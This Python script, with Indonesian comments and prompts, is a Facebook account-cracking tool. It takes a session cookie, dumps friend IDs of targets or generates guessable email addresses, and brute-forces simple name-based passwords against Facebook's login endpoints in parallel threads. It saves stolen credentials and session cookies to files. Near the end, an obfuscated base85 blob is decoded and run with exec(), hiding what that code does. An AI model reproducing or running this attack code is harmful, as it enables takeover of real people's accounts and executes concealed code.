#!/usr/bin/python3
#coding=utf-8
#open source code - date : 20 Jan 2023
#record? boleh, asal mokad update sendiri 


try:
	import os, sys, bs4, random, re
	import requests, json, time, datetime
	from bs4 import BeautifulSoup
	from datetime import datetime
	from concurrent.futures import ThreadPoolExecutor as tred
except Exception as e:
	exit(e)
	
#--------------> CONVERT TANGGAL <--------------#
ct = datetime.now()
n = ct.month
bulan = [
			"Januari","Februari","Maret",
			"April","Mei","Juni",
			"Juli","Agustus","September",
			"Oktober","November","Desember"
		]
try:
	if n < 0 or n > 12:
		exit()
	nTemp = n - 1
except ValueError:
	exit()

current = datetime.now()
thn = current.year
bln = current.month
har = current.day
opp = bulan[nTemp]
P,M,H,K,B,U,O,M2,H2,K2,P2,B2,U2,O2,M3,H3,K3,P3,B3,U3,O3 = ['\x1b[0;97m','\x1b[0;91m','\x1b[0;32m','\x1b[0;33m','\x1b[0;44m','\x1b[0;35m','\x1b[0;36m',"[#FF0000]","[#00FF00]","[#FFFF00]","[#FFFFFF]","[#00C8FF]","[#AF00FF]","[#00FFFF]","#FF0000","#00FF00","#FFFF00","#FFFFFF","#00C8FF","#AF00FF","#00FFFF"] # dont change this default color
ok, cp, loop = 0,0,0
#--------------> SYNTAX <--------------#
def jalan(mlaku):
	for aja in mlaku + "\n":
		sys.stdout.write(aja)
		sys.stdout.flush()
		time.sleep(0.03)
#--------------> LOGIN <--------------#
class Peler:
	
	def __init__(self):
		self.id, self.uid, self.log = [],[],[]
		self.pas, self.pwz, self.hasil = [],[],[]
		self.xyz = requests.Session()
#--------------> LOGO - LO GOBLOK <--------------#
	def poster(self):
		os.system("clear")
		print(f"""
   _________ ______ ______
  /  ______//  ___//  ___/
 /  /____  /  /   /  /_
 \_____  \/  / __/  __/ ®
  /  /_\  \ /__\ \ /
  \  _____/ ______\/
   \/ {H}Code{P}\/{H}By Aang-XD{P}
		""")
#--------------> LOGIN WITH COOKIES <--------------#
	def login(self):
		try:
			self.poster()
			cookie = input("%s>> Cookie : "%(P))
			cookies = {"cookie":cookie}
			req = self.xyz.get("https://www.facebook.com/adsmanager/manage/campaigns",cookies=cookies)
			research = re.search("act=(.*?)&nav_source",str(req.content)).group(1)
			link = "%s?act=%s&nav_source=no_referrer"%("https://www.facebook.com/adsmanager/manage/campaigns", research)
			date = self.xyz.get(link, cookies=cookies)
			tokn = re.search('accessToken="(.*?)"',str(date.content)).group(1)
			token = open("token.txt", "w").write(tokn)
			cokie = open("kukis.txt", "w").write(cookie)
			jalan("%s>> Tunggu sebentar ..."%(P));Login().dulu()
		except Exception as e:
			os.system("rm -rf kukis.txt && rm -rf token.txt")
			jalan(f"%s>> Cookie invalid ..."%(P))
			exit(e)
#--------------> MENU PILIHAN <--------------#
	def menu(self):
		try:
			token = open("token.txt","r").read()
			cokis = open("kukis.txt","r").read()
		except requests.exceptions.ConnectionError:
			jalan(f"%s\n>> Koneksi bermasalah ..."%(P));exit()
		except (KeyError, IOError):
			os.system("clear")
			jalan(f"%s\n>> Cookie invalid ..."%(P));time.sleep(1)
			self.login()
		try:
			ling = self.xyz.get(f"https://graph.facebook.com/me?fields=name&access_token={token}", cookies = {'cookie':cokis})
			nama = json.loads(ling.text)["name"]
		except (KeyError, IOError):
			os.system("clear")
			jalan(f"%s\n>> Cookie invalid ..."%(P));time.sleep(1)
			self.login()
		self.poster()
		print("%s[ Selamat datang %s%s%s ]\n"%(P,H,nama,P))
		print("%s1. Dump id teman publik"%(P))
		print("%s2. Dump id publik massal"%(P))
		print("%s3. Dump search email"%(P))
		print("%s0. Log-out "%(P))
		jawab = input("\n%s>> Pilih : "%(P))
		if jawab == "1" or jawab == "01":self.publik()
		elif jawab == "2" or jawab == "02":self.massal()
		elif jawab == "3" or jawab == "03":self.email()
		elif jawab == "0" or jawab == "00":
			os.system("rm -rf kukis.txt && rm -rf token.txt")
			jalan("%s\n>> Ingfo login terhapus"%(P));exit()
#--------------> DUMP PUBLIK TUNGGAL <--------------#
	def publik(self):
		try:
			token = open("token.txt","r").read()
			cokis = open("kukis.txt","r").read()
		except IOError:exit()
		pb = input("%s\n>> Enter id : "%(P));self.uid.append(pb)
		for target in self.uid:
			try:
				date = self.xyz.get(f"https://graph.facebook.com/v14.0/{target}?fields=name,friends.limit(5000)&access_token={token}",cookies = {'cookies':cokis}).json()
				search = date["name"]
				for x in date["friends"]["data"]:
					try:self.id.append(x["username"]+"|"+x["name"])
					except:self.id.append(x["id"]+"|"+x["name"])
			except (KeyError,IOError):
				jalan("%s\n>> Target tidak publik ..."%(P));time.sleep(1);exit()
		try:
			print("\n%s>> Target name  : %s%s"%(P,H,search))
			print("%s>> Id terkumpul : %s%s"%(P,H,str(len(self.id))))
			self.default()
		except requests.exceptions.ConnectionError:
			jalan(f"%s\n>> Koneksi bermasalah ..."%(P));time.sleep(1);exit()
#--------------> DUMP PUBLIK MASSAL <--------------#
	def massal(self):
		try:
			token = open("token.txt","r").read()
			cokis = open("kukis.txt","r").read()
		except IOError:exit()
		try:nambah = int(input("\n%s>> Enter jumlah id, max 50 : "%(P)))
		except ValueError:exit()
		if nambah<1 or nambah>50:
			jalan("%s>> Maximal %s50 id%s saja"%(P,H,P));time.sleep(1);self.menu()
		ftv=0
		for z in range(nambah):
			ftv+=1
			mas = input("%s>> Enter id : "%(P))
			self.uid.append(mas)
		for target in self.uid:
			try:
				date = self.xyz.get(f"https://graph.facebook.com/v14.0/{target}?fields=name,friends.limit(5000)&access_token={token}",cookies = {'cookies':cokis}).json()
				search = date["name"]
				for sig in date["friends"]["data"]:
					try:
						jumlah = (sig["id"]+"|"+sig["name"])
						if jumlah in self.id:pass
						else:
							self.id.append(jumlah)
					except:continue
			except (KeyError,IOError):
				jalan("%s\n>> Target tidak publik ..."%(P));time.sleep(1);exit()
		try:
			print("\n%s>> Target name  : %s%s"%(P,H,search))
			print("%s>> Id terkumpul : %s%s"%(P,H,str(len(self.id))))
			self.default()
		except requests.exceptions.ConnectionError:
			jalan(f"%s\n>> Koneksi bermasalah ..."%(P));time.sleep(1);exit()
#--------------> DUMP SEARCH EMAIL <--------------#
	def email(self):
		global ok, cp
		one = ["sekar","ayu","prasetyo","cantik","cntk","pratama","wibu","tzy","pubg","oleng","ahmad","hudayat","ramadhan","saputra","gabut","andi","dwi","muhammad","mohammad","dewi","nur","tri","dian","sri","putri","eka","sari","aditya","budi","cahya","riski","risky","gunawan","darmawan","hadi"]
		two = ["sarah","ramadhan","xxx","gans","slank","ska","yyy","santuy","cans","pribadi","ganz","999","official","gaming","utama","123","321","coc","ml","ff","12345","cakep","bkp","234","firmansyah","wahyudi","satrio","purnama","joko","ahlan"]
		nama = input("\n%s>> Enter nama : "%(P))
		if "," in str(nama):
			jalan("\n%s>> Masukin nama 1 saja kontol"%(P))
			time.sleep(1);self.menu()
		print("\n%s>> Cth : @gmail.com/@yahoo.com"%(P))
		domain = input("%s>> Enter domain : "%(P))
		if "@" not in str(domain) or ".com" not in str(domain):
			jalan("\n%s>> Masukan domain dengan benar"%(P))
			time.sleep(1);self.menu()
		jumlah = input("%s>> Total email :  "%(P))
		for qp in range(int(jumlah)):
			XX = nama
			YY = [
					f"{str(random.choice(one))}",
					f"{str(random.randint(0,41))}",
					f"{str(random.choice(two))}",
					f"{str(random.choice(one))}{str(random.randint(0,41))}",
					f"{str(random.choice(one))}.{str(random.randint(0,41))}",
					f"{qp}",
					f"{str(random.choice(two))}{str(random.randint(0,41))}",
					f"{str(random.choice(one))}{str(random.choice(two))}"
					f"{str(random.choice(two))}.{str(random.randint(0,41))}",
					f"{str(random.choice(one))}.{str(random.choice(two))}"
				]
			ZZ = domain
			QQ = f"{XX}{str(random.choice(YY))}{ZZ}"
			if QQ in self.id:pass
			else:self.id.append(QQ+"|"+nama)
			print(f"\r%s>> Proses dump email : %s  "%(P,len(self.id)), end='');sys.stdout.flush()
		self.default()
#--------------> METHOD & PENGATURAN PASSWORD <--------------#
	def default(self):
		ask = input("\n%s>> Password manual (y/t): "%(P))
		if ask == "y" or ask == "Y" or ask == "ya" or ask == "YA":
			self.pas.append("yamete")
			print("%s>> Gunakan tanda (,) untuk pemisah"%(P))
			print("%s>> Cth : sayakangen,mantan"%(P))
			her = input("%s>> Password : "%(P))
			sandi = her.split(",")
			for e in sandi:
				self.pwz.append(e)
		print("\n%s>> 1. Log mobile [off]"%(P))
		print("%s>> 2. Log graph.api "%(P))
		ask = input("\n%s>> Pilih : "%(P))
		if ask == "1" or ask == "01":self.log.append("mobile")
		elif ask == "2" or ask == "02":self.log.append("graph")
		else:self.log.append("graph")
		self.password()
#--------------> CRACKER <--------------#
	def brute(self, user, asw, url):
		global ok, cp, loop
		for pw in asw:
			try:
				params = (
					{
						"access_token": "200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16",
						"sdk_version": {random.randint(1,26)}, 
						"email": user,
						"locale": "zh_CN",
						"password": pw,
						"sdk": "android",
						"generate_session_cookies": "1",
						"sig": "4f648f21fb58fcd2aa1c65f35f441ef5"
				}
					)
				headers = (
					{
						"Host": url,
						"x-fb-sim-hni": str(random.randint(100000, 300000)),
						"x-fb-net-hni": str(random.randint(100000, 300000)),
						"x-fb-connection-quality": "EXCELLENT",
						"user-agent": Ngocox().kanjut(),
						"content-type": "application/x-www-form-urlencoded",
						"x-fb-device-group": f"{str(random.randint(1000, 4000))}",
						"x-fb-friendly-name": "RelayFBNetwork_GemstoneProfilePreloadableNonSelfViewQuery",
						"x-fb-request-analytics-tags": "unknown",
						"accept-encoding": "gzip, deflate",
						"x-fb-http-engine": "Liger",
						"connection": "close"
				}
					)
				post = self.xyz.post(f"https://{url}/auth/login?locale=zh_CN", params=params, headers=headers, allow_redirects=False)
				if "session_key" in post.text and "EAA" in post.text:
					coki = ";".join(i["name"]+"="+i["value"] for i in post.json()["session_cookies"]);user = re.findall("c_user=(\d+)",coki)[0]
					ok+=1
					print("\r%s*--> %s%s|%s|%s"%(P,H,user,pw,coki))
					open("OK/%s-%s-%s.txt"%(har,opp,thn),"a").write(user+"|"+pw+"|"+coki+"\n")
					self.hasil.append(user+"|"+pw+"|"+coki);os.popen("play-audio data/audio/ok.mp3")
					break
				elif "User must verify their account" in post.text:
						print("\r%s*--> %s%s|%s              "%(P,K,user,pw))
						cp+=1
						open("CP/%s-%s-%s.txt"%(har,opp,thn),"a").write(user+"|"+pw+"\n")
						self.hasil.append(user+"|"+pw);os.popen("play-audio data/audio/cp.mp3")
						break
				elif "Calls to this api have exceeded the rate limit. (613)" in post.text:
					sys.stdout.write("\r%s>> %s/%s - [OK:%s%s%s] [CP:%s%s%s] "%(P,loop,len(self.id),H,ok,P,K,cp,P), end=""),sys.stdout.flush()
					time.sleep(10)
				else:continue
			except ConnectionError:
				time.sleep(10)
		loop +=1
		sys.stdout.write("\r%s>> %s/%s - [OK:%s%s%s] [CP:%s%s%s] "%(P,loop,len(self.id),H,ok,P,K,cp,P)),sys.stdout.flush()
#--------------> ATUR KATA SANDI <--------------#
	def password(self):
		print("\n%s>> %sOK%s save : OK/%s-%s-%s.txt"%(P,H,P,har,opp,thn))
		print("%s>> %sCP%s save : CP/%s-%s-%s.txt\n"%(P,K,P,har,opp,thn))
		with tred(max_workers=20) as __rampung__:
			for AangXD in self.id:
				user,__cans__ = AangXD.split("|")[0],AangXD.split("|")[1].lower()
				__kiya__ = __cans__.split(" ")[0]
				asw = []
				if len(__cans__)<6:
					if len(__kiya__)<3:pass
					else:
						asw.append(__kiya__+'123');asw.append(__kiya__+'1234');asw.append(__kiya__+'12345')
				else:
					if len(__kiya__)<3:asw.append(__cans__)
					else:asw.append(__cans__);asw.append(__kiya__+'123');asw.append(__kiya__+'1234');asw.append(__kiya__+'12345')
				if "yamete" in self.pas:
					for u in self.pwz:
						asw.append(u)
				else:pass
				if "mobile" in self.log:__rampung__.submit(self.brute, user, asw, "m.facebook.com")
				elif "graph" in self.log:__rampung__.submit(self.brute, user, asw, "graph.facebook.com")
				else:__rampung__.submit(self.brute, user, asw, "graph.facebook.com")
		print("\n\n%s[ %sProgram Finished%s ]"%(P,H,P))
		time.sleep(1);exit()
#--------------> CONVERT USER AGENT <--------------#
class Ngocox:
	
	def kanjut(self):
		az = "A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"
		smart = str(random.randint(8, 12))
		chrome3 = str(random.randint(100, 300))
		chrome4 = str(random.randint(1000, 9000))
		builx = f"{random.choice(az)}{random.choice(az)}{random.choice(az)}{random.randint(10, 90)}{random.choice(az)}"
		chrome6 = str(random.randint(100000, 900000))
		ngentod = f"Mozilla/5.0 (Linux; Android {smart}; RMX2144) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.{chrome4}.{chrome3} Mobile Safari/537.36"
		return ngentod
exec((lambda _ : (__import__('base64').b85decode(_)))(b'Wq4&{C@5@UZDM3$AYULlAShp7X>D+Ca&%u`C?{fJb7eL(Cn+vsI5lKtV{c?-C|@ZlDJWtmS8+5ZdqY4qKvh~qO*14xSyfDIK~rdOH&{MID??!>C3Rp!KYM0MVmD<>C_`>5c5_KJY)f=jdt*N>LwrD5Y(z>|bZt{OD>YhVaalBROLk~}aZf5SG<Z{ac}X-(FilBFQ&vBBT0>Q7aeiV{Lp(u8B_T~!R5UA2dr~AdaaB+#R%BCGJ~>N7Qekvhc1(A3DpXEQZ9g_sG$md}QDieQC1GVoUP)49X(4J%Qbb^MQD=Q;M^a;JVLW3~RdIP&NKHp|OMG~6eN9kLae78;C_HpyQ*BuzQbTAvWl<=5J3L5dQF&KMR&OI&V^eh~eO5{{G<!{6Bq38ubzewIM?yI>PgP7IUr|h8D`GZLCS`m{O;KY#WKDZ8Gg)I(ZCPYia40fwQ7B+$G*4@CIU!Aaesm;ZIaNetR!Km1U}SM|Hz`VYQa5o-etm0pOLQqbSW-i1J~UZpLTF}LNIyw@O<;X}NmF`bds<d(X+L>WSZ;c8WPK(`UP^j;b7f3TJ#AJ_Mj<?VS|ol$S5<RxBVkW$HEL*MQ*BuzQbTAvWl<=5J3L5dQF&KFc}_N0M?+_CJXADtJ!MuuYe7~;YCdx$V^msST2@YaJ8w=%d~tkMO=3SWWKd{ebxmM>eL+`EH7R*gLwO^4VPP~wZBsZcNFz;Pek)UBQ*BvfR&jDmU{h8zRzFB4b9_BlZ$WQkM?+>RXHr9GJ7rNQIeJr8a(G}XLUmy^abr_;D0fpha8)W&VN*#nRc}2tXJk)IL}p}eP-03_Lufl?Q6^=4NLW8%LrP<Lb}c?adTUrTQz3CnDq=NvRc={DcsOfVDpy%`V^eKeWKu(DCT&D;S#f$<MR+)IO<+GvP)|iqF>X{edP{j)VtzhRVk0+rV^}I*a5+;XNiif+AyqLbLsCLVc3DMuIBQrdCOJ4_R46-0Qz3CnDq=NvRc={DcsOfVDpy%`V^eKeWKu(DCT&D;S#f$<MR+)IO<+GvP)|iqF>X{edP{j)WH&2mSw(nJWL0!1DQRP0WHB^SLufutN_l>1CQ)HDd16pVdrdS#e0FJlQ#fi+aYrgwbV_4)Yj8YceP<~lLsm3XEmKxhW@S%mOiDpnNK7a{O<;X}NmEr<VR%wQc_cz*aXm<UVKYunH&9|WdS+rXQG8QSEhSNVL3d|IWJGFvPB2z-C@L~gJSa^~R&X<OSVDGpCU8VPaY15CR!TT%S3p5jIZbj@KOtE}XjM~EVrF7ORzGQPN>FH3Sx8btdS-1|XF_OaQ#dV1BTaiSGh$UtAzx8VP)2$?S!H@yC_#2ebyr7fLPKj}RWNcSOMWdjMN2bBVRK7-cx!1;XE#7OV^eKeWK=X+erQ=|LT)%tUUw^RPE1UESwnkcQA<{QPfKNCHg{)fMQ(F5S5YWnD=lJGI81R%el0ddOEg0xXh>sjQ+P^tKWlemQ*BvfR5V$BXjx}MZa7X}cPnpBOiX-PLwjRUOH(0pH&;?&QfDSdBtlJAM`}b%O-?*SW@k=uL4Hz9d@)gRMk#(rH)T&>Z(u`FL~1QodnH6FR#0;|cVQ-Vbx~19KUOGJQFTQvO>Q_+WK~i~MPpK7QbT-XU_(bcQ+IYwPg6E2Bxz1cJw#<hFnLsUN+VirVq#ZfNjFS$RZf0WH#u2pRZm(|dQw?6UTaTmMRq7sCM!}zM=e-PK2B&&DM(IiElF)iHz8A1S59keR8eGBKQTySCVE~-XM25RV|-O>B}{unMR7rSY9VDrQE5OzPE1cJM`KfMSt?UDC_z?HVrxKkP-jmqXHZ5qOK(hHdu&ZsYAJbXWP3YUZCYq;G<`&HW=Tq7cxyO)R!uQaBujpKHzrs-Jv1axYcnZ!RZJmYQB6!eDq~SYWkfbvC`eRZPCO=UC_-^fO+QU;DRgN_WNJiiRbEk7QcH1JcqBu6V^K?1d{0YdS}90qDM~m+M?6(ja&0kUc{V9=R!Jx@dSX~wL{3Y5cx!1;XE-okR!wOoGFE(OQ#n#Mcwui-Ggx*wLU~kpYhzJ4Ep$>QD^zz(eP(?oR!l!VP)<r#Q9xr;ZCNT(Lufl?Q7C&qPg+8BKYn2$XFy^|D`rzIQ!{aCPESUCYf)KcEoV$uXh={cPiiB1Vp1q}Dn(XsKUy_nG+uacLU~M6B};vDWp7tcSx`|_G)787NMv+5T1|a2S7c93PhM?TOMP@POj1-NaZ@&4S9(xKGASrlO=5muQ#L3;R#9SWdqGM#O;t2uWH4DzOjUh!dQ&rKeKKQKY+goAUU*m}Ph}%@SweADV?9kxXg+UJBXm+VNMk5vQAjCbR$)thYd=L+K1+CdL~$i@PDo>JQ+P`-AuU#8Q*BuzQbTAvWl<=5J3L5dQF&KFc}_N0M?+_CUQ>2>Y&}mqCQvs|Dl<$<QZsd8VopFvbVyBZc|=%Zd3#neL~wdHQ&xN-HgZE>Xi0NTP&YwJRzNmJcu_@9czsGEV?k3_USDo*S8PL1VpvLSF*{*lLqSVIP;NkHQdmnjEmSliW=mvKazrRmLuFwjVJJ~ZK~O|hBvw>3c_c?rMn-r%Q*&P{DoH^xXiY+SY*c7gd}(uaQhHiMXi8y9T314ORCsGbel&Y~Oip@KXh%nEZ(m7ca!5;8UN}--M>|V%ds0JaJ7rNQIeJr8a(G}XLUmy^abr_;D0Nm!OE55Ec{^e?N;O_mEl64>Zem7eD03)NR(&HiLtt-peoS9|IbUULVQ^$sR#ihlR!T8*YGiaRH!5UwabtF5ek4#(LwjRUOH(!}Buhv^XiiQ<acxR|QDjUceo#CmB|uL}Vs#;8Qc7WIWKeN*ZedncIax<TXKyi5CM`iIVpc{mK0|yqEjCa_Uo<67K6pi0QXy_ZZCE>bQ%+THK2s)GXnbgOOMPoUMOHpbJ49kxc}s0pPI^OTNmqP%GDc@XLOoV|Xiy_pYiCn4OJ7e(ZAn&dBUxipbt!OCLufl?VPREdJxy>pc6m%uXmDvubtP3%Q&v=LLsoHmXLnLWG$lnrBT*z$Q*=LJK~{4mSUXxoLM2g4Fe6GmNM>YkGGbR{L@`q~C_z?HVrn}(MrnRAb5~C`U|LIkbZA;uNhmi^OH*$-Dnm{{Up!V{Ek-qCd|`JpR!U1SFk*UMa#v+hJ0vY+aBO{QOjAK<C{ko{M?FhcV=8z|Geb%<Qdu=#Yf&X%R6<NKIZjGOYhG7COMZG}G+HKkLN;MlUSuIwQgm8ZLRD8lWJqFZL1$1$OkyfyQ*}jBQbTAvWnp17Lu^?^cyCxuK5HZ)LVSKEC{0jANpDw7Qd(_MV_8B?O;TAud}3K|FiuQyLNPa3Jbg+^LV12#Gg@IcGbl?jGe9d=N-$7aRbMJnc}72WNk&H|Wnp_-S#C5TQbTAaZAn>eNKIK|UR7dAVr)`cP-Qf2D^g@>Az@BRLUCzNM<YvgMrv|jZe>w&GD=oHS8Hxeb9hKFQYLzHaats9WH(|pCU;O%GiP~6PCYO+N>x-+X?jv(W+OjNJtSIVQe!_cEm<gNGf-h+c2;;<XF_XbPc2MqbyP7nd16m%Awxh@R6A-dM<!)qds<m;H8xCOc~CY}SWhN(OHf`;U{*XMd2c5vDF'))

if __name__=="__main__":
	Peler().menu()
